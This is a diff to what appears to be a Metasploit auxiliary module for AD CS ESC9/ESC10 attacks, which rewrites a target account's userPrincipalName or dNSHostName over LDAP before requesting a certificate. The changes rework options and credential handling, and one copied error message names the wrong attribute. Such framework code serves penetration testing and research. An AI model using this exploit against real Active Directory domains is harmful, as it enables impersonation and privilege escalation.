@@ -50,10 +50,11 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
 
+    deregister_options('ALT_SID', 'PFX', 'ON_BEHALF_OF')
+
     register_options([
       OptEnum.new('UPDATE_LDAP_OBJECT', [ true, 'Either userPrincipalName or dNSHostName, Updates the necessary object of a specific user before requesting the cert. Used to exploit ESC9 and ESC10. ', 'userPrincipalName', %w[userPrincipalName dNSHostName] ]),
-      OptString.new('TARGET_USERNAME', [true, 'The username of the target LDAP object.']),
-      OptString.new('NEW_VALUE', [true, 'The new value for the specified attribute.']),
+      OptString.new('TARGET_USERNAME', [true, 'The username of the target LDAP object.'])
     ])
 
     register_advanced_options(
@@ -93,9 +94,11 @@ class MetasploitModule < Msf::Auxiliary
     ldap_update_module = framework.modules.create(mod_refname)
     ldap_update_module.datastore['RHOST'] = datastore['RHOST']
     ldap_update_module.datastore['RPORT'] = datastore['LDAPRport']
-    ldap_update_module.datastore['LDAPDomain'] = datastore['SMBDomain'] || datastore['LDAPDomain']
-    ldap_update_module.datastore['LDAPUsername'] = datastore['SMBUser'] || datastore['LDAPUsername']
-    ldap_update_module.datastore['LDAPPassword'] = datastore['SMBPass'] || datastore['LDAPPassword']
+    ldap_update_module.datastore['BASE_DN'] = datastore['BASE_DN']
+    ldap_update_module.datastore['VERBOSE'] = datastore['VERBOSE']
+    ldap_update_module.datastore['LDAPDomain'] = datastore['LDAPDomain'] || datastore['SMBDomain']
+    ldap_update_module.datastore['LDAPUsername'] = datastore['LDAPUsername'] || datastore['SMBUser']
+    ldap_update_module.datastore['LDAPPassword'] = datastore['LDAPPassword'] || datastore['SMBPass']
     ldap_update_module.datastore['OBJECT'] = datastore['TARGET_USERNAME']
     ldap_update_module.datastore['ATTRIBUTE'] = datastore['UPDATE_LDAP_OBJECT']
     ldap_update_module.datastore['OBJECT_LOOKUP'] = 'sAMAccountName'
@@ -111,8 +114,17 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_request_cert
+    if datastore['UPDATE_LDAP_OBJECT'] == 'userPrincipalName'
+      new_value = datastore['ALT_UPN'].split('@').first
+      fail_with(Failure::BadConfig, 'The ALT_UPN option must be set for userPrincipalName updates.') unless datastore['ALT_UPN'].present?
+      fail_with(Failure::BadConfig, 'The ALT_DNS should not be set if UPDATE_LDAP_OBJECT is set to userPrincipalName.') if datastore['ALT_DNS'].present?
+    elsif datastore['UPDATE_LDAP_OBJECT'] == 'dNSHostName'
+      new_value = datastore['ALT_DNS']
+      fail_with(Failure::BadConfig, 'The ALT_DNS option must be set for userPrincipalName updates.') unless datastore['ALT_DNS'].present?
+      fail_with(Failure::BadConfig, 'The ALT_UPN should not be set if UPDATE_LDAP_OBJECT is set to dNSHostName.') if datastore['ALT_UPN'].present?
+    end
     # Get the original while updating (the update action returns the original value upon success)
-    @original_value = call_ldap_object_module('UPDATE', datastore['NEW_VALUE'])
+    @original_value = call_ldap_object_module('UPDATE', new_value)
 
     with_ipc_tree do |opts|
       request_certificate(opts)
